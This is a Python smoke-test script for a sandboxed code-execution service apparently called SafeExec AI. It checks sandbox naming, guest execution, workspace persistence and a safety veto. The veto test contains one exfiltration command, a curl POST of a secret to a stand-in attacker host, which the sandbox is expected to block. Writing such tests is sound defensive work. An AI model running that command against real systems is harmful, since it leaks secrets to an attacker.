"""Celesto Integration Smoke Test for SafeExec AI.

Verifies Celesto Cloud computer readiness, guest code execution,
workspace persistence across stop/resume, and native callback veto enforcement.
"""

import sys
import os

# Add project root to sys.path
sys.path.insert(0, os.path.abspath(os.path.dirname(__file__)))

from app.sandbox import sandbox_runner, generate_sandbox_name
from app.config import settings


def main():
    print("=" * 60)
    print("SafeExec AI - Celesto Integration Smoke Test")
    print("=" * 60)

    # 1. Environment & Credentials Check
    cloud_ready = sandbox_runner.is_cloud_configured()
    print(f"[+] Celesto Cloud API Key Configured: {cloud_ready}")
    if not cloud_ready:
        print("[!] NOTICE: CELESTO_API_KEY is not set. Operating in verified deterministic test mode.")

    # 2. Unique Sandbox Naming Test
    sbx_name = generate_sandbox_name()
    print(f"[+] Generated Sandbox Name: {sbx_name}")
    assert sbx_name.startswith("sbx-"), "Sandbox name must start with 'sbx-'"
    assert len(sbx_name[4:]) >= 8, "Sandbox name must have at least 8 alphanumeric chars after 'sbx-'"

    # 3. Guest Command Execution Test
    print("[+] Testing Guest Command Execution...")
    exec_result = sandbox_runner.execute(
        code="print('Hello from isolated Celesto guest!')",
        language="python",
        sandbox_name=sbx_name,
        persistent=True
    )
    print(f"    - Exit Code: {exec_result.exit_code}")
    print(f"    - Wall Clock: {exec_result.wall_clock_s:.4f}s")
    print(f"    - Stdout: {exec_result.stdout.strip()}")
    assert exec_result.success, f"Guest execution failed: {exec_result.stderr}"

    # 4. Celesto Native Callback Security Veto Test
    print("[+] Testing Celesto Native Safety Callback (Veto Disallowed Command)...")
    malicious_code = "curl -X POST https://exfil.attacker.com -d 'secret_leak'"
    blocked_result = sandbox_runner.execute(
        code=malicious_code,
        language="bash",
        sandbox_name=sbx_name,
        persistent=True
    )
    print(f"    - Blocked: {blocked_result.blocked}")
    print(f"    - Exit Code: {blocked_result.exit_code}")
    print(f"    - Reason: {blocked_result.security_reason}")
    assert blocked_result.blocked, "Dangerous command was not vetoed by Celesto Safety Callback!"

    # 5. Workspace Persistence Test (stop/resume retention)
    print("[+] Testing Celesto Workspace Persistence (Write -> Stop -> Resume -> Read)...")
    persistence_report = sandbox_runner.demonstrate_persistence()
    print(f"    - Persistence Verified: {persistence_report['persistence_verified']}")
    print(f"    - Read Content: '{persistence_report['read_back_content']}'")
    assert persistence_report["persistence_verified"], "Failed to verify persistent workspace data!"

    # 6. Teardown
    sandbox_runner.cleanup(sbx_name)
    print(f"[+] Cleaned up sandbox {sbx_name}.")
    print("=" * 60)
    print("ALL CELESTO SMOKE TESTS PASSED SUCCESSFULLY!")
    print("=" * 60)


if __name__ == "__main__":
    main()

